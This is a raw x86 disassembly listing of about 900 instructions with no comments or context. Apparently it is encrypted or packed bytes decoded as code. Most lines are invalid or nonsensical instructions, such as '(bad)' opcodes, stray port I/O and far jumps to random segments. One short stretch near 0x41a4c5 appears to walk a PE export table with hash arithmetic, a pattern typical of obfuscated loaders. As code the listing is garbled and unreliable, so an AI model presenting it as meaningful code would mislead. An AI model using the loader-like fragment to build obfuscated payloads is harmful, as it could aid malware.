  419f51:	pop    esp
  419f52:	stos   BYTE PTR es:[edi],al
  419f53:	mov    esp,0xcb494715
  419f58:	test   BYTE PTR [eax+0x36],ch
  419f5b:	adc    edi,esp
  419f5d:	cmp    BYTE PTR [edi-0x66],dh
  419f60:	ror    edx,cl
  419f62:	xchg   edx,eax
  419f63:	in     al,dx
  419f64:	scas   eax,DWORD PTR es:[edi]
  419f65:	rep stos BYTE PTR es:[edi],al
  419f67:	sub    dh,BYTE PTR [eax]
  419f69:	(bad)  
  419f6a:	pop    edx
  419f6b:	out    dx,eax
  419f6c:	jnp    0x419f6c
  419f6e:	push   0x2
  419f70:	and    DWORD PTR [edi-0x42],0x4f2bcdc4
  419f77:	mov    dh,0xaf
  419f79:	adc    bl,BYTE PTR [esi+0x28]
  419f7c:	fdivr  st(1),st
  419f7e:	jl     0x419f32
  419f80:	pusha  
  419f81:	cmp    DWORD PTR [ebx+edi*8],edx
  419f84:	push   edi
  419f85:	retf   
  419f86:	mov    bl,0x11
  419f88:	std    
  419f89:	cmc    
  419f8a:	mov    al,0x89
  419f8c:	xor    BYTE PTR [edx-0x1d],bh
  419f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f90:	enter  0x49c0,0xea
  419f94:	or     BYTE PTR [edi+0x2190b132],al
  419f9a:	push   es
  419f9b:	pxor   mm2,QWORD PTR [ebx-0xf]
  419f9f:	fst    DWORD PTR [edx+0x27]
  419fa2:	xor    al,ch
  419fa4:	dec    ebp
  419fa5:	shl    DWORD PTR [edi+0x43426fc5],0xb9
  419fac:	iret   
  419fad:	jo     0x419f4d
  419faf:	dec    edx
  419fb0:	pop    ecx
  419fb1:	mov    esi,0x6780e9b1
  419fb6:	mov    WORD PTR [ebx+ebx*8-0x4f],?
  419fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fbb:	adc    eax,0x5059cfc7
  419fc0:	or     al,0x4e
  419fc2:	ja     0x41a005
  419fc4:	mov    edi,0xcfa29370
  419fc9:	or     DWORD PTR [esp+edi*2-0x1d],0xf
  419fce:	jl     0x41a029
  419fd0:	pop    esp
  419fd1:	mov    DWORD PTR [ebp+0x3d58fa14],0xa264b6f8
  419fdb:	pop    eax
  419fdc:	add    al,0x27
  419fde:	mov    edx,0xe5fe30a2
  419fe3:	push   cs
  419fe4:	mov    fs,esi
  419fe6:	ret    
  419fe7:	stos   BYTE PTR es:[edi],al
  419fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fe9:	outs   dx,BYTE PTR ds:[esi]
  419fea:	dec    eax
  419feb:	(bad)  
  419fec:	icebp  
  419fed:	push   es
  419fee:	inc    eax
  419fef:	bound  esp,QWORD PTR [ebx+0x7b]
  419ff2:	repnz icebp 
  419ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ff5:	(bad)  [ebx+edx*2]
  419ff8:	adc    al,0x26
  419ffa:	in     eax,dx
  419ffb:	in     al,0xfe
  419ffd:	inc    eax
  419ffe:	adc    eax,0x4ab24019
  41a003:	(bad)  
  41a004:	lods   al,BYTE PTR ds:[esi]
  41a005:	dec    eax
  41a006:	js     0x41a000
  41a008:	cmp    bh,dh
  41a00a:	shr    DWORD PTR [edi],cl
  41a00c:	fisttp DWORD PTR [edx-0x61]
  41a00f:	pop    ecx
  41a010:	cld    
  41a011:	cmp    al,BYTE PTR [esi]
  41a013:	cmp    edi,edi
  41a015:	sbb    DWORD PTR [edx+0x64f6dbd2],edx
  41a01b:	in     eax,dx
  41a01c:	stc    
  41a01d:	add    edi,DWORD PTR ds:[ebp-0x6af6f3d5]
  41a024:	and    ecx,ebp
  41a026:	inc    eax
  41a027:	adc    ebx,edx
  41a029:	xlat   BYTE PTR ds:[ebx]
  41a02a:	cmc    
  41a02b:	xlat   BYTE PTR ds:[ebx]
  41a02c:	repz dec eax
  41a02e:	mov    dh,0x98
  41a030:	or     ch,BYTE PTR [ecx+0x7e]
  41a033:	push   ecx
  41a034:	cld    
  41a035:	rol    BYTE PTR [edi+edx*2+0x1fa77eae],0x12
  41a03d:	and    al,BYTE PTR [edx+0xb]
  41a040:	pop    ss
  41a041:	fist   WORD PTR [ebp+0x3713e06]
  41a047:	push   eax
  41a048:	cmp    BYTE PTR [esi],cl
  41a04a:	jbe    0x41a0b4
  41a04c:	std    
  41a04d:	xlat   BYTE PTR ds:[ebx]
  41a04e:	or     bh,BYTE PTR [edx-0x207c4056]
  41a054:	rcr    BYTE PTR [edx-0x5302f7d8],cl
  41a05a:	hlt    
  41a05b:	(bad)  
  41a05c:	xchg   esp,eax
  41a05d:	fld    TBYTE PTR [edi-0x37]
  41a060:	xchg   esi,eax
  41a061:	and    ax,0xdeea
  41a065:	jecxz  0x41a096
  41a067:	mov    ch,0x1b
  41a069:	jns    0x41a07b
  41a06b:	mov    ch,0x53
  41a06d:	push   eax
  41a06e:	repnz cmp bh,BYTE PTR [eax-0x29]
  41a072:	jno    0x41a074
  41a074:	call   0x844c2029
  41a079:	mov    esp,0x62c6a78a
  41a07e:	sub    ebx,DWORD PTR [edx+0x2ac9be39]
  41a084:	push   ss
  41a085:	jmp    0x4c50:0x600e8759
  41a08c:	mov    DWORD PTR [esi+0x7e],0xf624544c
  41a093:	lahf   
  41a094:	xlat   BYTE PTR ds:[ebx]
  41a095:	sbb    ecx,DWORD PTR [eax]
  41a097:	push   es
  41a098:	es mov esi,0x8240cad2
  41a09e:	jmp    0x41a087
  41a0a0:	dec    edx
  41a0a1:	cwde   
  41a0a2:	push   ds
  41a0a3:	jge    0x41a10f
  41a0a5:	dec    edi
  41a0a6:	call   0x2071059b
  41a0ab:	and    eax,0xc38b6a1
  41a0b0:	test   al,0x58
  41a0b2:	div    BYTE PTR [ebx*8-0x888c81d]
  41a0b9:	push   esp
  41a0ba:	std    
  41a0bb:	xchg   bl,al
  41a0bd:	out    0xa8,eax
  41a0bf:	inc    eax
  41a0c0:	outs   dx,DWORD PTR ds:[esi]
  41a0c1:	xlat   BYTE PTR ds:[ebx]
  41a0c2:	outs   dx,BYTE PTR ds:[esi]
  41a0c3:	arpl   WORD PTR [esi],bp
  41a0c5:	out    dx,eax
  41a0c6:	scas   eax,DWORD PTR es:[edi]
  41a0c7:	inc    ebx
  41a0c8:	scas   eax,DWORD PTR es:[edi]
  41a0c9:	or     ch,ah
  41a0cb:	and    al,0xb8
  41a0cd:	xchg   BYTE PTR [esi+0x19c4299d],dl
  41a0d3:	retf   0xbc37
  41a0d6:	mov    ds:0x4577010b,eax
  41a0db:	jmp    0x41a0c2
  41a0dd:	pop    ss
  41a0de:	cmp    dl,bl
  41a0e0:	leave  
  41a0e1:	and    ch,BYTE PTR [edx]
  41a0e3:	stos   DWORD PTR es:[edi],eax
  41a0e4:	(bad)
  41a0e8:	es push es
  41a0ea:	push   ecx
  41a0eb:	fabs   
  41a0ed:	lds    ebp,FWORD PTR [eax+0x55]
  41a0f0:	jmp    0x41a08d
  41a0f2:	stos   DWORD PTR es:[edi],eax
  41a0f3:	outs   dx,DWORD PTR ds:[esi]
  41a0f4:	(bad)  
  41a0f5:	pop    ss
  41a0f6:	push   esi
  41a0f7:	mov    ?,edi
  41a0f9:	xlat   BYTE PTR ds:[ebx]
  41a0fa:	mov    dl,BYTE PTR [edi]
  41a0fc:	mov    eax,0xef8df79f
  41a101:	inc    esp
  41a102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a103:	stc    
  41a104:	xchg   esp,eax
  41a105:	or     BYTE PTR [esi],ch
  41a107:	cmp    BYTE PTR [esi-0x2f5f6831],bh
  41a10d:	in     eax,0x73
  41a10f:	dec    esp
  41a110:	xchg   ecx,eax
  41a111:	fucom  st(6)
  41a113:	adc    al,0xb6
  41a115:	psubsb xmm0,XMMWORD PTR [edx]
  41a119:	xor    eax,0x3ea64889
  41a11e:	lds    eax,FWORD PTR [ebp-0x7dce6719]
  41a124:	(bad)  [ecx+0x4f]
  41a127:	xchg   edi,eax
  41a128:	mov    eax,0x18c8650e
  41a12d:	arpl   WORD PTR [eax-0x75246680],si
  41a133:	pusha  
  41a134:	out    dx,eax
  41a135:	fwait
  41a136:	xor    BYTE PTR [edi],ah
  41a138:	jmp    0x41a18b
  41a13a:	xchg   ebp,eax
  41a13b:	xor    BYTE PTR [edi-0x1d37b5cf],bh
  41a141:	stos   BYTE PTR es:[edi],al
  41a142:	daa    
  41a143:	leave  
  41a144:	xor    eax,0x7c0335b7
  41a149:	fnsave [edi+0x273eeeff]
  41a14f:	push   ecx
  41a151:	ret    0x6a25
  41a154:	retf   
  41a155:	ret    0xd2ee
  41a158:	xchg   esp,eax
  41a159:	pop    esp
  41a15a:	or     esp,DWORD PTR [ebx-0xc]
  41a15d:	mov    eax,es
  41a15f:	jno    0x41a196
  41a161:	fisubr WORD PTR [edx+0x2d650ade]
  41a167:	push   edi
  41a168:	pusha  
  41a169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a16a:	push   eax
  41a16b:	scas   eax,DWORD PTR es:[edi]
  41a16c:	and    eax,0x6d29808a
  41a171:	adc    al,0xe6
  41a173:	sbb    al,0x0
  41a175:	aad    0x8
  41a177:	sti    
  41a178:	pop    es
  41a179:	mov    ecx,0x9dfed9c6
  41a17e:	cmp    DWORD PTR [edi],eax
  41a180:	push   cs
  41a181:	imul   ebp,DWORD PTR [ebx],0x63
  41a184:	call   0x8653:0x91847605
  41a18b:	cmp    ebx,ebp
  41a18d:	add    al,BYTE PTR [ecx+0x68]
  41a190:	sbb    DWORD PTR [esi+0xa531f67],ebx
  41a196:	mov    dl,0x6b
  41a198:	xlat   BYTE PTR ds:[ebx]
  41a199:	or     cl,ch
  41a19b:	adc    esi,DWORD PTR [eax+0x5cd564da]
  41a1a1:	mov    esp,0xc7988fd4
  41a1a6:	mov    esi,0x61dbbb3c
  41a1ab:	es addr16 int3 
  41a1ae:	xchg   ebx,eax
  41a1af:	lahf   
  41a1b0:	(bad)  
  41a1b1:	stc    
  41a1b2:	mov    cl,BYTE PTR [ebx-0xe9b1184]
  41a1b8:	dec    esp
  41a1b9:	mov    edi,0xafcf1795
  41a1be:	retf   0x17f4
  41a1c1:	or     ah,bh
  41a1c3:	stos   DWORD PTR es:[edi],eax
  41a1c4:	shl    BYTE PTR [edx],cl
  41a1c6:	loope  0x41a1ed
  41a1c8:	sbb    BYTE PTR [edi+0x1939d1a7],ah
  41a1ce:	adc    ah,BYTE PTR [esi+0x5b]
  41a1d1:	sub    eax,0x9d79f36a
  41a1d6:	clc    
  41a1d7:	out    0x3f,al
  41a1d9:	xchg   ecx,eax
  41a1da:	ja     0x41a16c
  41a1dc:	mov    bl,0xc1
  41a1de:	inc    edi
  41a1df:	xor    DWORD PTR cs:[ebp-0x7e],edx
  41a1e3:	mov    al,ds:0x5e633d1c
  41a1e8:	sbb    eax,0xf01f7366
  41a1ed:	push   esp
  41a1ee:	mov    edx,0x8b90c510
  41a1f3:	dec    edi
  41a1f4:	add    BYTE PTR [edx+0x2985f4c7],ah
  41a1fa:	add    ebx,DWORD PTR [ecx]
  41a1fc:	ins    BYTE PTR es:[edi],dx
  41a1fd:	ins    BYTE PTR es:[edi],dx
  41a1fe:	mov    ebx,0xc61645de
  41a203:	adc    bl,BYTE PTR [ecx+0x5019456b]
  41a209:	pop    edx
  41a20a:	jmp    0x447:0x8854eb5a
  41a211:	or     ebp,DWORD PTR [eax-0x4c]
  41a214:	sub    eax,0xc1f6676f
  41a219:	cmc    
  41a21a:	out    0xba,eax
  41a21c:	push   edi
  41a21d:	js     0x41a216
  41a21f:	imul   edi,DWORD PTR [esi+0x25a4be33],0x6b
  41a226:	ss inc ebp
  41a228:	sub    ch,BYTE PTR [eax+edx*2-0x5f]
  41a22c:	test   DWORD PTR [edi-0x4],ebp
  41a22f:	jmp    0x41a1e2
  41a231:	mov    edi,0xb28ef5d1
  41a236:	clc    
  41a237:	add    eax,0x23801a6c
  41a23c:	push   edx
  41a23d:	stos   DWORD PTR es:[edi],eax
  41a23e:	jno    0x41a23d
  41a240:	inc    ebp
  41a241:	lock push ebx
  41a243:	scas   eax,DWORD PTR es:[edi]
  41a244:	test   eax,0x19ac6357
  41a249:	dec    edi
  41a24a:	xchg   BYTE PTR [edi-0x6d],ah
  41a24d:	mov    dh,0xbc
  41a24f:	(bad)  
  41a250:	ja     0x41a28f
  41a252:	neg    DWORD PTR [ecx]
  41a254:	xlat   BYTE PTR ds:[ebx]
  41a255:	mov    dl,0xdf
  41a257:	xchg   ecx,eax
  41a258:	inc    ebp
  41a259:	(bad)  [eax+0x27f88a56]
  41a25f:	in     eax,dx
  41a260:	pop    esp
  41a261:	scas   al,BYTE PTR es:[edi]
  41a262:	sti    
  41a263:	dec    esp
  41a264:	push   cs
  41a265:	push   edx
  41a266:	pop    ebx
  41a267:	fcom   QWORD PTR [edx+0x6e53e8a4]
  41a26d:	call   0xfcc3:0x98492d82
  41a274:	push   es
  41a275:	icebp  
  41a276:	cmp    DWORD PTR [edi],edi
  41a278:	push   ss
  41a279:	aam    0x1f
  41a27b:	pop    es
  41a27c:	mov    ch,bh
  41a27e:	dec    esp
  41a27f:	mov    ds,WORD PTR [edi]
  41a281:	inc    ecx
  41a282:	loope  0x41a266
  41a284:	in     al,dx
  41a285:	jb     0x41a294
  41a287:	pop    es
  41a288:	call   0x3e05:0x4d710a44
  41a28f:	fcmove st,st(4)
  41a291:	dec    ebp
  41a292:	add    eax,0xa6d4182a
  41a297:	in     eax,0xb
  41a299:	aam    0x1a
  41a29b:	loopne 0x41a2a6
  41a29d:	mov    al,ds:0x8450d820
  41a2a2:	xor    dl,BYTE PTR [ecx]
  41a2a4:	push   ebx
  41a2a5:	push   ds
  41a2a6:	jno    0x41a307
  41a2a8:	(bad)  
  41a2a9:	and    eax,0x731ddbb0
  41a2ae:	call   0xe32f10c2
  41a2b3:	cmp    DWORD PTR ds:0xcd16d806,ebp
  41a2b9:	push   ecx
  41a2ba:	cmp    DWORD PTR [eax],ebp
  41a2bc:	pop    es
  41a2bd:	push   cs
  41a2be:	das    
  41a2bf:	mov    esp,0x451f9a65
  41a2c4:	inc    ebp
  41a2c5:	sub    BYTE PTR [esi-0x17],dl
  41a2c8:	jle    0x41a27b
  41a2ca:	cs popa 
  41a2cc:	jo     0x41a29d
  41a2ce:	nop
  41a2cf:	xchg   esp,eax
  41a2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d1:	ss out dx,al
  41a2d3:	mov    ebx,0xcc3d8e10
  41a2d8:	mov    dl,0x3f
  41a2da:	fadd   st(7),st
  41a2dc:	adc    ecx,DWORD PTR [ecx-0x55ff346b]
  41a2e2:	xor    ch,BYTE PTR [eax]
  41a2e4:	inc    edx
  41a2e5:	mov    cs,WORD PTR [eax+0x1c]
  41a2e8:	xor    dh,bl
  41a2ea:	sub    ebp,DWORD PTR [eax-0x7]
  41a2ed:	push   edx
  41a2ee:	test   al,0xe0
  41a2f0:	add    DWORD PTR ds:0x118c8aad,esp
  41a2f6:	mov    ds:0x1b7c7357,al
  41a2fb:	mov    ch,0x98
  41a2fd:	jne    0x41a2c7
  41a2ff:	popf   
  41a300:	(bad)  
  41a301:	cld    
  41a302:	mov    cl,0x13
  41a304:	mov    ebx,0x7ae24ddf
  41a309:	or     al,0x84
  41a30b:	pop    ax
  41a30d:	push   0x2b47345c
  41a312:	and    eax,0x8c8e1d8e
  41a317:	stos   BYTE PTR es:[edi],al
  41a318:	stos   BYTE PTR es:[edi],al
  41a319:	jge    0x41a333
  41a31b:	arpl   WORD PTR [edi+0x6c0d4946],ax
  41a321:	mov    eax,ds:0xc7f0d757
  41a326:	sub    DWORD PTR [ecx],esi
  41a328:	jbe    0x41a324
  41a32a:	or     ah,al
  41a32c:	scas   eax,DWORD PTR es:[edi]
  41a32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a32e:	in     al,0x21
  41a330:	loop   0x41a351
  41a332:	xor    DWORD PTR [ebp+0xe],esp
  41a335:	and    DWORD PTR [ebx-0x44eebb77],ecx
  41a33b:	push   ebp
  41a33c:	fs jmp 0x1de68819
  41a342:	in     eax,dx
  41a343:	sbb    dl,BYTE PTR [edi]
  41a345:	mov    bh,0xaf
  41a347:	cs jae 0x41a382
  41a34a:	dec    ecx
  41a34b:	clc    
  41a34c:	ret    0x869f
  41a34f:	stc    
  41a350:	mov    DWORD PTR [esi-0x56],eax
  41a353:	xor    al,0xab
  41a355:	(bad)  
  41a357:	in     eax,dx
  41a358:	pop    ebx
  41a359:	js     0x41a376
  41a35b:	dec    edi
  41a35c:	push   ecx
  41a35d:	lahf   
  41a35e:	jmp    0xe79b:0xe8d51bcd
  41a365:	nop
  41a366:	cld    
  41a367:	mov    al,ds:0x7da2cabe
  41a36c:	xchg   esp,eax
  41a36d:	(bad)  
  41a36e:	xchg   edx,eax
  41a36f:	fadd   QWORD PTR [ecx+edi*1-0x18]
  41a373:	push   ecx
  41a374:	mov    esi,DWORD PTR [ebx-0x18]
  41a377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a378:	loope  0x41a36d
  41a37a:	and    al,BYTE PTR ds:0x8c3c9cff
  41a380:	fidiv  DWORD PTR [edx+0x36b662d5]
  41a386:	inc    esp
  41a387:	shr    BYTE PTR [edx+0x2b],0xfb
  41a38b:	inc    esp
  41a38c:	or     DWORD PTR [ebx-0xf],esi
  41a38f:	xchg   ebx,eax
  41a390:	push   ebx
  41a391:	jbe    0x41a34f
  41a393:	clc    
  41a394:	xor    dl,BYTE PTR [ebp-0x431ac029]
  41a39a:	iret   
  41a39b:	cmc    
  41a39c:	xchg   DWORD PTR [esi+0x1c8b68ac],edx
  41a3a2:	xchg   edi,eax
  41a3a3:	in     al,0xd2
  41a3a5:	sahf   
  41a3a6:	je     0x41a400
  41a3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3a9:	inc    esi
  41a3aa:	jae    0x41a42b
  41a3ac:	fadd   st(0),st
  41a3ae:	ss jne 0x41a3c2
  41a3b1:	into   
  41a3b2:	sbb    al,0x74
  41a3b4:	jb     0x41a426
  41a3b6:	lods   al,BYTE PTR ds:[esi]
  41a3b7:	fs adc al,0x3a
  41a3ba:	jnp    0x41a3c0
  41a3bc:	daa    
  41a3bd:	sbb    BYTE PTR [edx-0x49],0x47
  41a3c1:	dec    ebp
  41a3c2:	(bad)  
  41a3c3:	lods   eax,DWORD PTR ds:[esi]
  41a3c4:	stos   BYTE PTR es:[edi],al
  41a3c5:	fimul  WORD PTR [edi+0x31]
  41a3c8:	ins    DWORD PTR es:[edi],dx
  41a3c9:	loopne 0x41a432
  41a3cb:	push   esi
  41a3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3cd:	xchg   DWORD PTR [ecx-0x39],ebp
  41a3d0:	pop    ecx
  41a3d1:	or     eax,0x30e4e3f0
  41a3d6:	or     dh,BYTE PTR [ebp-0x29]
  41a3d9:	dec    ecx
  41a3da:	das    
  41a3db:	push   ebx
  41a3dc:	push   esp
  41a3dd:	mov    edx,DWORD PTR [edx]
  41a3df:	jp     0x41a3dd
  41a3e1:	arpl   WORD PTR fs:[esi],sp
  41a3e4:	fnstsw WORD PTR [esi-0x7d]
  41a3e7:	fs cwde 
  41a3e9:	setnp  BYTE PTR [eax-0x56]
  41a3ed:	xlat   BYTE PTR ds:[ebx]
  41a3ee:	dec    esp
  41a3ef:	out    dx,eax
  41a3f0:	xor    DWORD PTR [ebp+0x4],esi
  41a3f3:	imul   DWORD PTR [edi+0x176f2c85]
  41a3f9:	jecxz  0x41a414
  41a3fb:	mov    edx,0x307e469b
  41a400:	jg     0x41a43e
  41a402:	test   bh,al
  41a404:	inc    edx
  41a405:	enter  0xb868,0x1f
  41a409:	inc    esp
  41a40a:	add    DWORD PTR [esi],edi
  41a40c:	sar    BYTE PTR [ecx-0x7318628],0xbe
  41a413:	(bad)  
  41a414:	mov    ebp,0x64a2b9d3
  41a419:	jmp    FWORD PTR [ebx+0x621be188]
  41a41f:	hlt    
  41a420:	sbb    dh,dh
  41a422:	cmc    
  41a423:	mov    bh,0x36
  41a425:	imul   edx,DWORD PTR [eax-0x7d],0xff8ef935
  41a42c:	xor    bh,BYTE PTR [esi+0x62]
  41a42f:	xchg   DWORD PTR [edi-0x3],esp
  41a432:	pop    esp
  41a433:	lock jo 0x41a3f5
  41a436:	jecxz  0x41a45d
  41a438:	and    eax,0xbe480e0f
  41a43d:	sbb    al,0xf6
  41a43f:	lds    edi,FWORD PTR [eax+0x2]
  41a442:	nop
  41a443:	pop    ebx
  41a444:	in     eax,dx
  41a445:	or     DWORD PTR [ebx],edx
  41a447:	lods   eax,DWORD PTR ds:[esi]
  41a448:	dec    ebp
  41a449:	das    
  41a44a:	ret    0x1515
  41a44d:	into   
  41a44e:	lock fldcw WORD PTR [edi+eax*1-0x715f8126]
  41a456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a457:	out    dx,eax
  41a458:	pshufw mm1,QWORD PTR [ebx+0x6],0x10
  41a45d:	inc    eax
  41a45e:	push   eax
  41a45f:	jmp    0x76d5c66
  41a464:	pop    ebp
  41a465:	test   DWORD PTR [ebp+0x33],esp
  41a468:	loopne 0x41a455
  41a46a:	mov    dl,0x90
  41a46c:	pop    ebx
  41a46d:	mov    dh,0x3a
  41a46f:	pop    esp
  41a470:	shl    bh,0x9c
  41a473:	test   DWORD PTR [ebp+0x19c90b33],ebp
  41a479:	push   ds
  41a47a:	cmp    eax,0x92cbf242
  41a47f:	mov    dh,0x8f
  41a481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a482:	xor    eax,DWORD PTR ds:0x4f667934
  41a488:	add    bl,BYTE PTR [ebx+0x5bed4bc0]
  41a48e:	in     eax,0x36
  41a490:	sub    ah,BYTE PTR [edx]
  41a492:	mov    al,ds:0xf8a4fc9a
  41a497:	stos   DWORD PTR es:[edi],eax
  41a498:	in     eax,dx
  41a499:	inc    edi
  41a49a:	call   0x4aad:0xc92d5dc3
  41a4a1:	xchg   edi,eax
  41a4a2:	aam    0xf9
  41a4a4:	xor    BYTE PTR [ecx-0x7b],0x98
  41a4a8:	fistp  DWORD PTR [edi+eax*1]
  41a4ab:	cmp    al,0xf7
  41a4ad:	sahf   
  41a4ae:	mov    esi,0x2a67d51e
  41a4b3:	pop    es
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x4eb64455]
  41a500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x5]
  41a50a:	rol    DWORD PTR [edi+0x1cadf62],1
  41a510:	adc    al,0x50
  41a512:	loop   0x41a581
  41a514:	sbb    eax,0x282c1fe5
  41a519:	into   
  41a51a:	imul   BYTE PTR [esi+ecx*1-0x34b52d11]
  41a521:	lock fidivr WORD PTR [edx-0x1a]
  41a525:	push   eax
  41a526:	jmp    0x41a57f
  41a528:	xchg   ecx,edi
  41a52a:	jb     0x41a4d4
  41a52c:	(bad)  
  41a52d:	cmc    
  41a52e:	jl     0x41a550
  41a530:	pop    ds
  41a531:	fs rol bh,1
  41a534:	push   0xffffffa1
  41a536:	jno    0x41a5ab
  41a538:	mov    WORD PTR [edx+0x618f5dfd],ds
  41a53e:	dec    DWORD PTR [ebx-0x71931ffb]
  41a544:	fadd   DWORD PTR ds:0x681ccce8
  41a54a:	mov    ds:0x5a495332,eax
  41a54f:	test   BYTE PTR [ecx-0x2962c22c],cl
  41a555:	jnp    0x41a5ab
  41a557:	rcr    BYTE PTR ds:0xb7051247,1
  41a55d:	mov    cl,0x1d
  41a55f:	stos   DWORD PTR es:[edi],eax
  41a560:	mov    DWORD PTR [eax+0x95ce554],ecx
  41a566:	inc    ebx
  41a567:	push   edx
  41a568:	cwde   
  41a569:	jmp    0x41a580
  41a56b:	jmp    0xf50d3dff
  41a570:	inc    esp
  41a571:	arpl   WORD PTR [edx+0x4a],bx
  41a574:	dec    eax
  41a575:	test   al,0x3
  41a577:	call   0x35f0d24c
  41a57c:	xchg   ebp,eax
  41a57d:	mov    bl,0x2a
  41a57f:	idiv   DWORD PTR [edi]
  41a581:	xor    eax,DWORD PTR [esi-0x7f2d74ed]
  41a587:	popf   
  41a588:	jno    0x41a531
  41a58a:	out    0xb,eax
  41a58c:	and    edx,edi
  41a58e:	bound  ecx,QWORD PTR [ebx-0x53172750]
  41a594:	mov    BYTE PTR [edi+ebx*8],ah
  41a597:	jle    0x41a60b
  41a599:	addr16 in eax,0xbe
  41a59c:	sbb    ebp,ebx
  41a59e:	add    BYTE PTR [esi+0x6a],dh
  41a5a1:	cmp    eax,0xce285478
  41a5a6:	in     eax,dx
  41a5a7:	pop    eax
  41a5a8:	xchg   ebx,eax
  41a5a9:	das    
  41a5aa:	dec    ecx
  41a5ab:	sbb    al,0x7
  41a5ad:	sbb    BYTE PTR [esi-0x73],dl
  41a5b0:	js     0x41a56d
  41a5b2:	mov    edx,DWORD PTR [edx+eax*2+0x72422efc]
  41a5b9:	gs ret 
  41a5bb:	adc    DWORD PTR ds:0xfa72362e,edx
  41a5c1:	xlat   BYTE PTR ds:[ebx]
  41a5c2:	mov    esp,0x42b04f0d
  41a5c7:	loope  0x41a5a5
  41a5c9:	jecxz  0x41a5a7
  41a5cb:	test   eax,0xf50a4a5b
  41a5d0:	cmp    al,0x18
  41a5d2:	mov    ds:0x717f4ffa,eax
  41a5d7:	inc    esi
  41a5d8:	jge    0x41a5c8
  41a5da:	stos   BYTE PTR es:[edi],al
  41a5db:	adc    eax,0x4a8ee1fe
  41a5e0:	test   al,0xe0
  41a5e2:	pop    ebx
  41a5e3:	call   0x3b89:0xdff7d955
  41a5ea:	jo     0x41a648
  41a5ec:	mov    ah,0x55
  41a5ee:	add    DWORD PTR [edx+0x19],ebp
  41a5f1:	push   es
  41a5f2:	fld    TBYTE PTR [esi-0x6dfb85a5]
  41a5f8:	jle    0x41a5fa
  41a5fa:	lods   eax,DWORD PTR ds:[esi]
  41a5fb:	jl     0x41a603
  41a5fd:	mov    dl,0x9c
  41a5ff:	ror    BYTE PTR [edx],cl
  41a601:	mov    dl,0x3
  41a603:	push   edx
  41a604:	out    0xa6,al
  41a606:	loope  0x41a668
  41a608:	fcom   QWORD PTR [eax]
  41a60a:	sub    edx,DWORD PTR [eax-0x4377e299]
  41a610:	bound  ebp,QWORD PTR [eax-0xf]
  41a613:	rcl    BYTE PTR [ebx+0x6174e72a],0xc0
  41a61a:	fdivr  DWORD PTR ds:0x64bc5ba2
  41a620:	jae    0x41a624
  41a622:	test   al,0x33
  41a624:	(bad)  
  41a625:	test   al,0xef
  41a627:	gs xchg ebp,eax
  41a629:	inc    edi
  41a62a:	enter  0x2753,0xac
  41a62e:	fld    QWORD PTR [edi]
  41a630:	dec    ecx
  41a631:	repnz sbb al,0xa
  41a634:	mov    ds:0x58453767,eax
  41a639:	xchg   esi,eax
  41a63a:	outs   dx,BYTE PTR ds:[esi]
  41a63b:	in     al,dx
  41a63c:	pop    ss
  41a63d:	outs   dx,DWORD PTR ds:[esi]
  41a63e:	mov    WORD PTR [ecx-0x123b6f36],ss
  41a644:	push   ss
  41a645:	xchg   edi,eax
  41a646:	mov    BYTE PTR [edx+0x6a],0x2d
  41a64a:	cmp    ebp,DWORD PTR [ebx-0x5e5aa609]
  41a650:	xchg   edi,edx
  41a652:	shl    BYTE PTR [eax],cl
  41a654:	jmp    0xfb2c:0x7833406b
  41a65b:	mov    eax,0xd1c77c71
  41a660:	mov    edi,0x6fb779ff
  41a665:	mov    bl,BYTE PTR [esi+0xe575333]
  41a66b:	add    DWORD PTR [edx-0x713eecf5],edx
  41a671:	lea    edi,[ecx-0x5b]
  41a674:	jb     0x41a647
  41a676:	inc    esp
  41a677:	push   ss
  41a678:	mov    ebx,0xf8e3cb64
  41a67d:	fmul   QWORD PTR ds:[ecx+ecx*1-0x3]
  41a682:	dec    edi
  41a683:	dec    eax
  41a684:	addr16 xchg edx,eax
  41a686:	adc    eax,0x6853b290
  41a68b:	pop    edx
  41a68c:	aad    0x8a
  41a68e:	test   BYTE PTR [esi],dl
  41a690:	test   al,0x75
  41a692:	mov    WORD PTR [ecx],gs
  41a694:	out    0xdc,al
  41a696:	dec    eax
  41a697:	popf   
  41a698:	mov    al,0xf5
  41a69a:	mov    edx,0x32b58a91
  41a69f:	xor    DWORD PTR [eax],esp
